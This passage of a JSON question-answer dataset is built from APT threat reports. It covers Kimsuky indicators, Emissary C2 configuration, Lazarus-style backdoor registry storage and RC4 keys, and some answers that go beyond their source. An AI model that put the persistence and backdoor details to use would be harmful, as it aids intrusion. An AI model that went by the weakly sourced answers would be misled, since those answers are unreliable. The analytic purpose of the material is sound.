IP-addresses have been uncovered that would point to the attackers' activity and belong to other IP-ranges. Interestingly, the ISPs providing internet access in these provinces are also believed to maintain lines into North Korea. Finally, this geo-location supports the likely theory that the attackers behind Kimsuky are based in North Korea.\nBig Headline: Appendix\nFiles used by malware:\n%windir%system32kbdlv2.dll\n%windir%system32auto.dll\n%windir%system32netsvcs.exe\n%windir%system32netsvcs_ko.dll\n%windir%system32vcmon.exe\n%windir%system32svcsmon.exe\n%windir%system32svcsmon_ko.dll\n%windir%system32wsmss.exe\n%temp%~DFE8B437DD7C417A6D.TMP\n%temp%~DFE8B43.TMP\n%temp%~tmp.dll\nC:Windowstaskmgr.exe\nC:Windowssetup.log\nC:Windowswinlog. txt\nC:Windowsupdate.log\nC:Windowswmdns.log\nC:Windowsoledvbs.inc\nC:Windowsweoig.log\nC:Windowsdata.dat\nC:Windowssys.log\nC:WindowsPcMon. exe\nC: WindowsGoogle Update.exe\nC:WindowsReadMe. log\nC:Windowsmsdatt. bat\nC:Windowsmsdatl3. inc\nC: Program FilesCommon FilesSystemOle DBmsdmeng.cnt\nC: Program FilesCommon FilesSystemOle DBxmlrwbin.inc\nC: Program FilesCommon FilesSystemOle DBmsdapml.cnt\nC: Program FilesCommon FilesSystemOle DBsqlsoldb.exe\nC: Program FilesCommon FilesSystemOle DBoledjvs.inc\nC: Program FilesCommon FilesSystemOle DBoledvbs.inc\nC: Program FilesCommon FilesSystemOle DBmsolui80.inc\nC: Program FilesCommon FilesSystemOle DBmsdaipp.cnt\nC: Program FilesCommon FilesSystemOle DBmsdaerr.cnt\nC: Program FilesCommon FilesSystemOle DBsqlxmlx.inc\n<Hangul full path>HncReporter.exe\nRelated MD5:\n3baaf1a873304d2d607dbedf47d3e2b4\n3195202066f026de3abfe2f966c9b304\n4839370628678f0afe3e6875af010839\n173c1528dc6364c44e887a6c9bd3e07c        191d2da5da0e37a3bb3cbca830a405ff        5eef25dc875cfcb441b993f7de8c9805\nb20c5db37bda0db8eb1af8fc6e51e703         face9e96058d8fe9750d26dd1dd35876\n9f7faf77b1a2918ddf6b1ef344ae199d        d0af6b8bdc4766d1393722d2e67a657b        45448a53ec3db51818f57396be41f34f        80cba157c1cd8ea205007ce7b64e0c2a        f68fa3d8886ef77e623e5d94e7db7e6c        4a1ac739cd2ca21ad656eaade01a3182        4ea3958f941de606a1ffc527eec6963f        637e0c6d18b4238ca3f85bcaec191291        b3caca978b75badffd965a88e08246b0        dbedadc1663abff34ea4bdc3a4e03f70        3ae894917b1d8e4833688571a0573de4        8a85bd84c4d779bf62ff257d1d5ab88b        d94f7a8e6b5d7fc239690a7e65ec1778        f1389f2151dc35f05901aba4e5e473c7        96280f3f9fd8bdbe60a23fa621b85ab6        f25c6f40340fcde742018012ea9451e0        122c523a383034a5baef2362cad53d57        2173bbaea113e0c01722ff8bc2950b28        2a0b18fa0887bb014a344dc336ccdc8c        ffad0446f46d985660ce1337c9d5eaa2        81b484d3c5c347dc94e611bae3a636a3        ab73b1395938c48d62b7eeb5c9f3409d        69930320259ea525844d910a58285e15\nNames of services created by malware:\nDriverManage\nWebService\nWebClientManager\nRemote Access Service\nWe detect these threats as Trojan.Win32.Kimsuky except modified Team Viewer client components which are detected as Trojan.Win32.Patched.ps.\n\nHow does the Kimsuky operation utilize the TeamViewer software for remote control, and what modifications were made to the original software?",
    "output": "A: The Kimsuky operation utilizes a modified version of TeamViewer client version 5.0.9104 for remote control. The malware author modified the TeamViewer components by replacing all instances of 'Teamviewer' strings with either 'Goldstager' or 'Coinstager'. The dropper creates three files in the C:\\\\Windows\\\\System32 directory: netsvcs.exe (the modified Team Viewer client), netsvcs_ko.dll (resources library of Team Viewer client), and vcmon.exe (installer/starter). It also creates a service called 'Remote Access Service' to execute vcmon.exe at system startup. Additionally, the malware disables AhnLab's firewall by zeroing out specific registry values and modifies Team Viewer registry settings to set a pre-shared authentication value.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the APT reported in Citizenlab_Campaign-Chinese-language-news-sites(07-05-2017) use Defense Evasion techniques to avoid detection?",
    "output": "Defense Evasion refers to the techniques used by adversaries to avoid detection throughout their compromise. In the case of the APT reported in Citizenlab_Campaign-Chinese-language-news-sites(07-05-2017), the operators demonstrated patience and persistence, using content and domains mimicking Chinese-language news sites as lures since at least 2015. To evade detection, they combined obfuscated, packed executables and custom shellcode with an additional step of using compromised servers to host the payload. This technique is a clear example of Defense Evasion, as it aims to hide and masquerade the malware from security software and analysts. Furthermore, the use of compromised servers to host the payload adds an extra layer of complexity to the attack, making it harder to detect and analyze. Additionally, the operators' ability to quickly shut down the campaign and move on to new targeting when their efforts were not successful also suggests a level of Defense Evasion, as they are actively trying to avoid being detected. Overall, the APT's use of Defense Evasion techniques highlights the importance of implementing robust security measures to detect and prevent such attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Darkhotel APT group maintain persistence on infected systems, allowing them to maintain their foothold even after system restarts or credential changes?",
    "output": "The Darkhotel APT group uses various techniques to maintain persistence on infected systems. One method is by adding autorun registry settings to enable automatic start of their malicious components during system boot. For example, the small downloader module adds autorun registry settings to start the msieckc.exe executable during system boot. Additionally, the keylogger module stores its gathered data in a log file and maintains persistence across reboots by adding a simple addition to the HKCU run key. This allows the malware to continue running even after system restarts or credential changes. Furthermore, the information stealer module is designed to terminate itself on Windows with the system default codepage set to Korean, suggesting that the attackers may be trying to avoid detection in certain environments. Overall, the Darkhotel APT group's use of persistence techniques allows them to maintain their foothold on infected systems and continue to steal sensitive information.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Emissary 5.3 Analysis\nThe payload of this attack is a Trojan that we track with the name Emissary. This Trojan is related to\nthe Elise backdoor described in the report. Both Emissary and Elise are part of a malware group referred to as \"LStudio\", which is based on the following debug strings found in Emissary and Elise samples:\nd:\\lstudio\\projects\\worldclient\\emissary\\Release\\emissary\\i386\\emissary.pdb\nd:\\lstudio\\projects\\lotus\\elise\\Release\\EliseDLL\\i386\\EliseDLL.pdb\nThere is code overlap between Emissary and Elise, specifically in the use of a common function to log debug messages to a file and a custom algorithm to decrypt the configuration file. The custom algorithm used by Emissary and Elise to decrypt their configurations use the \"srand\" function to set a seed value for the \"rand\" function, which the algorithm uses to generate a key. While the \"rand\" function is meant to generate random numbers, the malware author uses the \"srand\" function to seed the \"rand\" function with a static value. The static seed value causes the \"rand\" function to create the same values each time it is called and results in a static key to decrypt the configuration. The seed value is where the Emissary and Elise differ in their use of this algorithm, as Emissary uses a seed value of 1024 (as seen in Figure 6) and Elise uses the seed value of 2012.\nThe loader Trojan named \"ishelp.dll\" had an original name of \"Loader.dll\", which will extract the Emissary payload from a resource named \"asdasdasdasdsad\" and write it to a file named \"A08E81B411.DAT\". The loader will then write an embedded configuration to a file named \"75BD50EC.DAT\". The loader Trojan creates a mutex named \"_MICROSOFT_LOADER_MUTEX_\" and finishes by injecting the Emissary DLL in \"A08E81B411.DAT\" into a newly spawned Internet Explorer process.\nThe Emissary Trojan runs within the Internet Explorer process. It begins by reading and decrypting its configuration file, which has the following structure:\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\nstruct emissary_config {\nWORD emissary_version_major;\nWORD emissary_version_minor;\nCHAR[36] GUID_for_sample;\nWORD Unknown1;\nCHAR[128] Server1;\nCHAR[128] Server2;\nCHAR[128] Server3;\nCHAR[128] CampaignName;\nCHAR[550] Unknown2;\nWORD Delay_interval_seconds;\n};\nWe decrypted and parsed the configuration file that accompanied the payload used in this attack, which resulted in the following settings:\nVersion: 5.3\nGUID: ba87c1c5\u00adf71c\u00ad4a8b\u00adb511\u00ad07aa113d9103\nC2 Server 1: http://ustar5.PassAs[.]us/default.aspx\nC2 Server 2: http://203.124.14.229/default.aspx\nC2 Server 3: http://dnt5b.myfw[.]us/default.aspx\nCampaign Code: UPG\u00adZHG\u00ad01\nSleep Delay: 300\nAfter decrypting the configuration file, Emissary interacts with its command and control (C2) servers using HTTP or HTTPS, depending on the protocol specified in the configuration file. The initial network beacon sent from Emissary to its C2 server, seen in Figure 7, includes a Cookie field that contains a \"GUID\", \"op\" and \"SHO\" field. The GUID field is a unique identifier for the compromised system that is obtained directly from the configuration file. The op field has a value of \"101\", which is a static value that represents the initial network beacon. The SHO field contains the external IP address of the infected system, which Emissary obtains from a legitimate website \"showip.net\", specifically parsing the website's response for '<input id=\"checkip\" type=\"text\" name=\"check_ip\" value=', which contains the IP address of the system.\nThe C2 server response to this beacon (seen in Figure 8) will contain a header field called \"Set\u00adCookie\", which contains a value of \"SID\". The SID value is base64 encoded and encrypted using a rolling XOR algorithm, which once decoded and decrypted contains a 36\u00adcharacter GUID value. The Emissary Trojan will use this GUID value provided by the C2 server as an encryption key that it will use to encrypt data sent in subsequent network communications.\nThe C2 server provides commands to the Trojan as a three digit numeric string within the data portion of the HTTP response (in the form of \"op=<command>\"), which the Emissary Trojan will decrypt and compare to a list of commands within its command handler. The command handler function within the Emissary Trojan supports six commands, as seen in Table 2.\nIf the command issued from the C2 server does not match the one listed in the Trojan saves the message \"unkown:%s\" to the log file. The command set available within Emissary allows the threat actors backdoor access to a compromised system. Using this access, the threat actors can exfiltrate data and carry out further activities on the system, including interacting directly with the system's command shell and downloading and executing additional tools for further functionality.\nBig Headline: Threat Infrastructure\nThe infrastructure associated with the Emissary C2 servers used in this attack includes ustar5.PassAs[.]us, 203.124.14.229 and dnt5b.myfw[.]us. The infrastructure is rather isolated as the only overlap in domains includes appletree.onthenetas[.]com. The overlap, as seen in Figure 9 involves two IP addresses that during the same time frame resolved both the appletree.onthenetas[.]com domain and the Emissary C2 domain of ustar5.PassAs[.]us. The other C2 domain used by this Emissary payload, specifically dnt5b.myfw[.]us currently resolves to the 127.0.0.1. This provides another glimpse into TTPs for these threat actors, as it suggests that the threat actors set the secondary C2 domains to resolve to the localhost IP address to avoid network detection and change this to a routable IP address when they need the C2 server operational. Additionally, while this infrastructure does not overlap with that used in Operation Lotus Blossom, that also fits with the TTPs. In each case, the threat actors used separate infrastructure for different targets, another way to help avoid detection.\nBig Headline: Conclusion\nAPT threat actors, most likely nation state\u00adsponsored, targeted a diplomat in the French Ministry of Foreign Affairs with a seemingly legitimate invitation to a technology conference in Taiwan. It is entirely possible the diplomat was truly invited to the conference, or at least would not have been surprised by the invitation, adding to the likelihood the attachment would have been opened. The actors were attempting to exploit CVE\u00ad2014\u00ad6332 to install a new version of the Emissary Trojan, specifically version 5.3.\nThe Emissary Trojan is related to the Elise malware used in , which was an attack campaign on targets in Southeast Asia, in many cases also with official looking decoy\ndocuments that do not appear to have been available online. Additionally, the targeting of a French diplomat based in Taipei, Taiwan aligns with previous targeting by these actors, as does the separate infrastructure. Based on the targeting and lures, Unit 42 assesses that the threat actors' collection requirements not only include militaries and government agencies in Southeast Asia, but also nations involved in diplomatic and trade agreements with them.\nQuestion: What is the significance of the static seed value used in the decryption algorithm by Emissary and Elise? How does this affect the security of the malware's operations?",
    "output": "Answer: The static seed value used in the decryption algorithm by Emissary and Elise is significant because it determines the predictability of the decryption key. Both Emissary and Elise use the 'srand' function to set a seed value for the 'rand' function, which generates a key for decrypting the configuration file. Emissary uses a seed value of 1024, while Elise uses 2012. The static nature of these seed values means that the 'rand' function produces the same sequence of numbers each time, resulting in a static decryption key. This predictability can be exploited by security analysts to reverse-engineer the decryption process and gain access to the malware's configuration, thereby compromising the security of its operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Malware 7: Passive Backdoors\nMD5: b9be8d53542f5b4abad4687a891b1c03\nType: PE32 executable (GUI) Intel 80386, for MS Windows\nSize: 102'400 bytes\nNames: hkcmd.exe\nInternal name: compact.exe\nLink time: 2016.01.08 16:41:18 (GMT)\nLinker version: 6.0\nProduct name (file version info): Windows Firewall Remote Management Used in: Incident #1\nThis executable was written using the Microsoft MFC framework. The application is designed to run as a service, however it can also start and work as a standalone non-service process. It registers with the name of \"helpsvcs\". The code is organized in classes, one of which, the main application class, has a static text variable set to \"PVS\", which seems to be unused in the code. This service relies on command line arguments passed as an integer defining the port number that it will listen to in the future. This is a reduced minimalistic way of configuring and using the backdoor in listening mode, however there is a class that is responsible for loading or saving full configuration block from/to the registry.\nThe registry value used to store the configuration depends on the parameter value (%parameter%) passed to the function. The registry configuration is located at HKCR\\NR%parameter%\\Content Setting.\nThe main service procedure generates a unique instance ID which is set to pseudo-randomly selected 8 bytes. Some previous versions of the code relied on some pseudo-random values derived from the current time and MAC addresses of available network cards, but then was changed to a hardware independent value.\nThis backdoor takes care of enabling ports in the Windows Firewall by creating a new firewall rule named \"Windows Firewall Remote Management\" using netsh.exe tool on Windows, which enables an incoming connection to any executable on the TCP port that is currently used by the backdoor. In case this rule has different name in other samples, it's quite easy to find it, because it doesn't specify which group of rules it belongs to, unlike all other default Windows Firewall rules. Sorting Firewall rules by group name may quickly reveal such an odd rule:\nThe backdoor provides process and file management, as well as the creation of TCP connection relays.\nAnother backdoor based on the same code was found in the same bank, however it was made as a standalone executable instead of a DLL. Short description and file properties are provided below:\nMD5: bbd703f0d6b1cad4ff8f3d2ee3cc073c\nLink time: 2014.09.22 13:12:17 (GMT)\nLinker version: 6.0\nSize: 106'496 bytes\nExport section timestamp: Fri Jan 8 16:41:26 UTC 2016\nOriginal name: fmapi.dll\nType: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\nUsed in: Incident #1\nThis file is a backdoor that listens to a port specified in the %WINDIR%\\temp\\scave.dat file as an integer number. It supports about 20 commands, which enable the operator to:\n\u25cf Collect general system information\n\u25cf Search files/directories by name\n\u25cf Start new process as current user\n\u25cf Start process as another logged in user\n\u25cf Start process and collect output from stdout\n\u25cf Get file from specified path\n\u25cf Drop new executables into system directory\n\u25cf Compress and download files\n\u25cf List processes and their respective loaded modules\n\u25cf Kill processes by name\n\u25cf Fake file timestamp by copying it from kernel32.dll\n\u25cf Start a new backdoor session on another port\n\u25cf List active terminals sessions with details\n\u25cf Relay TCP connections to a remote host\nThe executable contains a custom PE loader code that is identical to a custom PE loader from Lazarus Loader modules as LimaAlfa.\nThis module contains a small embedded executable in the data section, encrypted with a trivial (xor 0xb1, add 0x4f) method. The MZ header is wiped from that embedded file and is restored during decryption routine. Some other properties of the small embedded file are listed below (MD5: 8387ceba0c020a650e1add75d24967f2). This executable module is used to force unloading a DLL from memory.\nMedium Headline: Malware 8: Trojan Dropper\nDiscovered path: C:\\WINDOWS\\igfxpers.exe\nMD5: 6eec1de7708020a25ee38a0822a59e88\nSize: 253'952 bytes\nTime modified: 2016-01-18 06:08:36 (GMT)\nTime accessed: 2016-08-22 12:38:37 (GMT)\nTime changed: 2016-08-22 13:04:42 (GMT)\nTime created: 2016-01-18 06:08:32 (GMT)\nLink time: 2014-09-22 13:12:17 (GMT)\nLinker version: 6.0\nOther filenames: hkcmd.exe\nUsed in: Incident #1\nThis is a dropper of an embedded malware. It uses RC4 to decrypt resources and drop and start a new process from disk. The RC4 is an MD5 of a command line argument (secret passphrase) following \"-x\" parameter. The second command line argument \"-e\" defines the name for the new service to be registered. The MD5 hash of the passphrase is stored in the registry and is used by the DLL Loader in the later stage.\nThe binary picks one of the names to drop the payload to, and chooses a corresponding service description when registering.\nThe dropped file is saved into %SYSTEMROOT%\\System32\\%FileName%.dll on Windows 32-bit and %SYSTEMROOT%\\SysWow64\\%FileName%.dll on Windows 64-bit.\nKnown command line usage:\nhkcmd.exe -x <passphrase> -e LogonHours\nWe managed to find the right password (20+ characters long), which enabled us to decrypt the payload.\nMedium Headline: Malware 9: DLL Loader\nMD5: 268dca9ad0dcb4d95f95a80ec621924f\nLink time: 2014.12.08 13:12:17 (GMT)\nLinker version: 6.0\nSize: 192'512 bytes\nExport section timestamp: Fri Jan 8 16:54:25 UTC 2016\nType: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\nOriginal name: ext-ms-win-ntuser-dialogbox-l1-1-0.dll\nUsed in: Incident #1\nThis file is dropped by the Trojan Dropper described above. It is a malware loader service, which gets the decryption key from the registry, uses RC4 to decrypt an embedded resource and start the payload. The RC4 decryption key is obtained from\nHKCR\\NR%parameter%\\ContextHandler value, which is set by the Trojan Dropper during malware installation.\nThe embedded resource contains one of the Passive Backdoors described in this paper.\nAnother variant of the DLL loader heavily uses system registry to fetch the decryption key, and the encrypted payload.\nName: lcsvsvc.dll\nMD5: c635e0aa816ba5fe6500ca9ecf34bd06\nSHA1: d7d724718065b2f386623dfaa8d1c4d22df7b72c\nSHA256: 93e7e7c93cf8060eeafdbe47f67966247be761e0dfd11a23a3a055cf6b634120\nFile size: 1'545'216 bytes\nFile type: PE32+ executable (DLL) (GUI) x86-64, for MS Windows\nLink time: 2015.12.09 14:12:41 (GMT)\nExp. time: 2016.03.19 18:32:34 (GMT)\nLinker version: 10.0\nExport module Name: msshooks.dll\nUsed in: Incident #2\nThis module is similar to other 64-bit variants. However, it is registered as a service and gets an RC4 key and the payload from the registry values of its own service. The name of the service is not fixed and is probably set during installation stage.\nHere is the registry value path for the RC4 key and encrypted payload respectively:\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\%SERVICENAME%\\Security\\Data2 HKLM\\SYSTEM\\CurrentControlSet\\Services\\%SERVICENAME%\\Security\\Data0\nThe code gets the 16-bytes RC4 key from the registry (f9 65 8b c9 ec 12 f9 ae 50 e6 26 d7 70 77 ac 1e) and encrypted payload, decrypts the payload with that key and then decrypts it one more time with the following hardcoded key (previously seen in the backdoor management tool): 53 87 F2 11 30 3D B5 52 AD C8 28 09 E0 52 60 D0 6C C5 68 E2 70 77 3C 8F 12 C0 7B 13 D7 B3 9F 15\nThe final decrypted payload is loaded and started as a DLL in memory. At the time of analysis the attackers managed to wipe the payload in the registry with a benign system file data, so only the RC4 key remained untouched and was found in the registry.\n\nAnswer this question based on the above context: Explain the role of the registry in the configuration and operation of the passive backdoor 'hkcmd.exe'. How does it use the registry to store and retrieve its configuration?",
    "output": "The passive backdoor 'hkcmd.exe' uses the registry to store and retrieve its configuration. The registry value used to store the configuration depends on a parameter value (%parameter%) passed to the function. The registry configuration is located at 'HKCR\\\\NR%parameter%\\\\Content Setting'. This allows the backdoor to load or save a full configuration block from/to the registry, providing flexibility in its operation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: References\n[1] \"Dark Secrets\u2014Hacking Team commercial,\" accessed: 12-November-2013. [Online]. Available: http://bit.ly/1bCh57v\n[2] J. Scott-Railton, \"Revolutionary Risks: Cyber Technology and Threats in the 2011 Libyan Revolution,\" US Naval War College, Tech. Rep., 2013.\n[3] S. H. AlJalahma, \"Response to The Guardian\u2014UK companys software used against Bahrain activist,\" May 2013, accessed: 12-November-2013. [Online]. Available: http://bit.ly/19iVUUP\n[4] V. Silver, \"Gamma Says No Spyware Sold to Bahrain; May Be Stolen Copy,\" Jul. 2012, accessed: 12-November-2013. [Online]. Available: http://bloom.bg/17SOXQs\n[5] A. Jeffries, \"Meet Hacking Team, the company that helps the police hack you,\" Sep. 2013, accessed: 12-November-2013. [Online]. Available: http://bit.ly/1bCajyl\n[6] T. Brewster, \"From Bahrain To Belarus: Attack Of The Fake Activists,\" Jul. 2013, accessed: 12-November-2013. [Online]. Available: http://bit.ly/1gIgwhW\n[7] V. Silver, \"MJM as Personified Evil Says Spyware Saves Lives Not Kills Them,\" 2011, accessed: 12-November-2013. [Online]. Available: http://bloom.bg/170E8sQ\n[8] D. Gilbert, \"Hacking Team and the Murky World of State-Sponsored Spying,\" 2013, accessed: 12-November-2013. [Online]. Available: http://bit.ly/17tBBtm\n[9] R. Clayton, S. J. Murdoch, and R. N. Watson, \"Ignoring the Great Firewall of China,\" in PETS. Springer, 2006, pp. 20\u201335.\n[10] J. R. Crandall et al., \"ConceptDoppler: A Weather Tracker for Internet Censorship,\" in ACM CCS, 2007.\n[11] X. Xu, Z. M. Mao, and J. A. Halderman, \"Internet Censorship in China: Where Does the Filtering Occur?\" in Proc. PAM, 2011.\n[12] M. Sherr, G. Shah, E. Cronin, S. Clark, and M. Blaze, \"Can They Hear Me Now? A Security Analysis of Law Enforcement Wiretaps,\" in ACM CCS, 2009, pp. 512\u2013 523.\n[13] J. R. Crandall, M. Crete-Nishihata, and J. Knockel, \"Chat program censorship and surveillance in China: Tracking TOM-Skype and Sina UC,\" First Monday, vol. 18, no. 7, Jul. 2013, accessed: 8-August-2013. [Online]. Available: http://bit.ly/1fzNcHl\n[14] S. Wolchok, R. Yao, and J. A. Halderman, \"Analysis of the Green Dam Censorware System,\" Tech. Rep., 2009.\n[15] F. Li, A. Lai, and D. Ddl, \"Evidence of Advanced Persistent Threat: A case study of malware for political espionage,\" in MALWARE, 2011.\n[16] \"Default https access for Gmail,\" 2010, accessed: 7-August-2013. [Online]. Available: http://bit.ly/1bBktPM\n[17] \"Making Twitter more secure: HTTPS,\" 2011, accessed: 7-August-2013. [Online]. Available: http://bit.ly/1i7l9kM\n[18] L. Constantin, \"Facebook to roll out HTTPS by default to all users,\" 2012, accessed: 7-August-2013. [Online]. Available: http://bit.ly/1bsLBCm\n[19] \"FinFisher: Governmental IT Intrusion and Remote Monitoring Solutions,\" accessed: 12-November-2013. [Online]. Available: http://bit.ly/1840Lxn\n[20] \"BlackBerry rogue software leaves sour taste in UAE,\" 2013, accessed: 11-November-2013. [Online]. Available: http://on.ft.com/HVXvJP\n[21] Mandiant, \"The Advanced Persistent Threat,\" 2010.\n[22] \u2014\u2014, \"APT1: Exposing One of China's Cyber Espionage Units,\" 2013.\n[23] S. Fagerland, M. Krakvik, J. Camp, and N. Moran, \"Operation Hangover: Unveiling an Indian Cyberattack Infrastructure,\" 2013.\n[24] R. Deibert and R. Rohozinski, \"Tracking GhostNet: Investigating a Cyber Espionage Network,\" Information Warfare Monitor, p. 6, 2009.\n[25] S. Nagaraja and R. Anderson, \"The snooping dragon: social-malware surveillance of the Tibetan movement,\" Tech. Rep., 2009.\n[26] F. C. Solutions, \"\"njRAT\" Uncovered,\" 2013, accessed: 25-June-2013. [Online]. Available: http://bit.ly/1eJheel\n[27] \"FinFisher - Excellence in IT Investigation,\" accessed: 27-February-2014. [Online]. Available: http://www.finfisher.com/\n[28] R. Rolles, \"Unpacking virtualization obfuscators,\" in USENIX WOOT, 2009.\n[29] \"TEMU: The BitBlaze Dynamic Analysis Component,\" accessed: 7-August-2013. [Online]. Available: http://bit.ly/1clcxSZ\n[30] \"'Reinstate sacked official' call,\" 2013, accessed: 11-November-2013. [Online]. Available: http://bit.ly/1aRUZ4b\n[31] \"Unionist Questioned,\" 2013, accessed: 23-April-2013. [Online]. Available: http://bit.ly/1gHnBiS\n[32] N. Villeneuve, \"Fake Skype Encryption Service Cloaks DarkComet Trojan,\" Apr. 2012, accessed: 4-August-2013. [Online]. Available: http://bit.ly/17SpA1c\n[33] E. Galperin and M. Marquis-Boire, \"Fake YouTube Site Targets Syrian Activists With Malware,\" Mar. 2012, accessed: 4-August-2013. [Online]. Available: http://bit.ly/HSCRet\n[34] \u2014\u2014, \"New Wave of Facebook Phishing Attacks Targets Syrian Activists,\" Apr. 2012, accessed: 4-August-2013. [Online]. Available: http://bit.ly/1hDQsG8\n[35] \u2014\u2014, \"Pro-Syrian Government Hackers Target Activists With Fake Anti-Hacking Tool,\" Aug. 2012, accessed: 4-August-2013. [Online]. Available: http://bit.ly/1eJj12T\n[36] J. Scott-Railton and M. Marquis-Boire, \"A Call to Harm: New Malware Attacks Target the Syrian Opposition,\" Citizen Lab, Tech. Rep., Jun. 2013, accessed: 3-August-2013. [Online]. Available: http://bit.ly/1a2l9PK\n[37] E. Galperin and M. Marquis-Boire, \"Trojan Hidden in Fake Revolutionary Documents Targets Syrian Activists,\" May 2012, accessed: 4-August-2013. [Online]. Available: http://bit.ly/1cSJT0\n[38] M. Marquis-Boire and S. Hardy, \"Syrian Activists Targeted with BlackShades Spy Software,\" Jun. 2012, accessed: 12-November-2013. [Online]. Available: http://bit.ly/1a2l6mX\n[39] S. Fagerland, \"The Syrian Spyware,\" Feb. 2012, accessed: 4-August-2013. [Online]. Available: http://bit.ly/HLyGR9\n[40] Telecomix, \"REPORT of a Syrian spyware,\" p. 9, Feb. 2012, accessed: 4-August-2013. [Online]. Available: http://bit.ly/1bsNcIk\n[41] S. Faris, \"The Hackers of Damascus,\" Nov. 2012, accessed: 9-August-2013. [Online]. Available: http://buswk.co/17t8RRH\n[42] L. Aylward, \"Malware Analysis\u2014Dark Comet RAT,\" Nov. 2011, accessed: 4-August-2013. [Online]. Available: http://bit.ly/16ZXgag\n[43] Quequero, \"DarkComet Analysis\u2014Understanding the Trojan used in Syrian Uprising,\" Mar. 2012, accessed: 4-August-2013. [Online]. Available: http://bit.ly/19i6kEl\n[44] S. Denbow and J. Hertz, \"Pest Control: Taming the RATs,\" p. 14, accessed: 12-November-2013. [Online]. Available: http://bit.ly/1fzLA0m\n[45] B. Brumfield, \"Computer spyware is newest weapon in Syrian conflict,\" Feb. 2012, accessed: 4-August-2013. [Online]. Available: http://cnn.it/HLz5TA\n[46] \"jalnosra.com,\" accessed: 27-February-2014. [Online]. Available: jalnosra.com\n[47] \"Skype Encryption.wmv,\" accessed: 27-February-2014. [Online]. Available: http://bit.ly/HZ3e1y\n[48] E. Galperin and M. Marquis-Boire, \"The Internet is Back in Syria and So is Malware Targeting Syrian Activists,\" Dec. 2012, accessed: 4-August-2013. [Online]. Available: http://bit.ly/1bngqFc\n[49] \"Free Syrian Army Sex Tape\u2014Abdul Razzaq Tlass [NSFW],\" accessed: 5-August-2013. [Online]. Available: http://bit.ly/1gHqDDH\n[50] A. Lund, \"Holy Warriors: A field guide to Syria's jihadi groups,\" Oct. 2012, accessed: 5-August-2013. [Online]. Available: http://atfp.co/17t8yq5\n[51] \"Ahmed Mansoor and Four Other Pro-Democracy Activists Pardoned and Freed,\" 2013, accessed: 10-November-2013. [Online]. Available: http://bit.ly/18pHpis\n[52] \"Royal Group,\" accessed: 27-February-2014. [Online]. Available: http://www.royalgroupuae.com/\n[53] T. Katsuki, \"Crisis for Windows Sneaks onto Virtual Machines,\" 2012, accessed: 27-February-2014. [Online]. Available: http://bit.ly/MzheRJ\n[54] \"Hacking Team,\" accessed: 27-February-2014. [Online]. Available: http://www.hackingteam.it/\n[55] \"MPRESS,\" accessed: 27-February-2014. [Online]. Available: http://www.matcode.com/mpress.htm\n[56] \"Sign in using application-specific passwords,\" accessed: 27-February-2014. [Online]. Available: https://support.google.com/accounts/answer/185833?hl=en\n[57] S. Fagerland, \"Systematic cyber attacks against Israeli and Palestinian targets going on for a year,\" 2012, accessed: 12-November-2013. [Online]. Available: http://bit.ly/1aSdw07\n[58] V. Silver, \"Spyware Leaves Trail to Beaten Activist Through Microsoft Flaw,\" 2012, accessed: 14-November-2013. [Online]. Available: http://bloom.bg/1ja2geI\n[59] B. Hubbard, \"Emirates Balk at Activism in Region Hit by Uprisings,\" 2013, accessed: 14-November-2013. [Online]. Available: http://nyti.ms/I4n2Aw\n[60] \"SPY NET,\" accessed: 27-February-2014. [Online]. Available: http://newspynetrat.blogspot.com/\n[61] \"Asprotect SKE,\" accessed: 27-February-2014. [Online]. Available: http://www.aspack.com/asprotect32.html\n[62] \"Unpacking VBInject/VBCrypt/RunPE,\" 2010, accessed: 7-August-2013. [Online]. Available: http://bit.ly/1e28nS2\n[63] \"Ultimate Packer for eXecutables,\" accessed: 27-February-2014. [Online]. Available: http://upx.sourceforge.net/\n[64] \"CVE-2013-0422,\" accessed: 27-February-2014. [On-line]. Available: http://bit.ly/NA1O0A\n[65] njq8, \"New java drive-by 2013-1-11,\" 2013, accessed: 27-February-2014. [Online]. Available: http://www.devpoint.com/vb/t357796.html\n[66] \"Appin Technology Lab,\" accessed: 27-February-2014. [Online]. Available: http://www.appinonline.com/\n[67] C. Guarnieri, \"Analysis of the FinFisher Lawful Interception Malware,\" 2012, accessed: 7-August-2013. [Online]. Available: http://bit.ly/1eJjVMV\n[68] H. Moore, \"Critical Research: Internet Security Survey,\" 2012.\n[69] \"Democracy Index 2012: Democracy at a Standstill,\" 2012, accessed: 7-August-2013. [Online]. Available: http://bit.ly/HSEDMD\n[70] \"YARA -The pattern matching swiss knife for malware researchers,\" accessed: 27-February-2014. [Online]. Available: http://plusvic.github.io/yara/\n[71] \"Cross-platform Trojan controls Windows and Mac machines,\" 2012, accessed: 7-August-2013. [Online]. Available: http://bit.ly/1eJnJgZ\n[72] S. Golovanov, \"Adobe Flash Player 0-day and Hack-ingTeam's Remote Control System,\" 2013, accessed: 7-August-2013. [Online]. Available: http://bit.ly/17n12ro\n[73] \"Internet Census 2012,\" 2013, accessed: 7-August-2013. [Online]. Available: http://bit.ly/1i7rRHs\nQuestion: How did the report identify the involvement of companies like Gamma International and Hacking Team in providing surveillance technology to governments, and what was their response to these allegations?",
    "output": "Answer: The report identified the involvement of companies like Gamma International and Hacking Team by tracing the technology used in targeted attacks back to its programmers and manufacturers. These companies were found to sell 'lawful intercept' trojans and related equipment purportedly exclusively to governments. The report also mentioned responses from these companies, which included denials or indirect acknowledgements of their involvement. For instance, Gamma International denied selling spyware to Bahrain, suggesting it might have been a stolen copy, while Hacking Team claimed that governments need their technology to 'look through their target's eyes' rather than relying solely on 'passive monitoring'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
